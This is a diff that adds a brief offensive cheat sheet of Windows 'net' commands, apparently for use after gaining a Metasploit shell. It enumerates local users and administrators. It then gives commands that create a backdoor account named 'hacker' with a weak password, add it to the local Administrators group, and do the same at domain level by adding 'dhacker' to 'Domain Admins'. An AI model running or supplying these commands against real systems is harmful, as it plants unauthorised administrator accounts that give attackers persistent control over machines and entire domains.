@@ -1,0 +1,20 @@
+== Net (windows tool) commands ==
+
+	msf> shell
+
+	c:\> net users
+	...
+	c:\> net localgroup Administrators
+	...
+
+* Adding new admin user:
+
+	c:\> net user hacker password /add
+	c:\> net localgroup Administrators hacker /add
+
+* Same for DOMAIN LEVEL:
+
+	c:\> net user dhacker password /add /domain
+	c:\> net group "Domain Admins" dhacker /add /domain
+
+
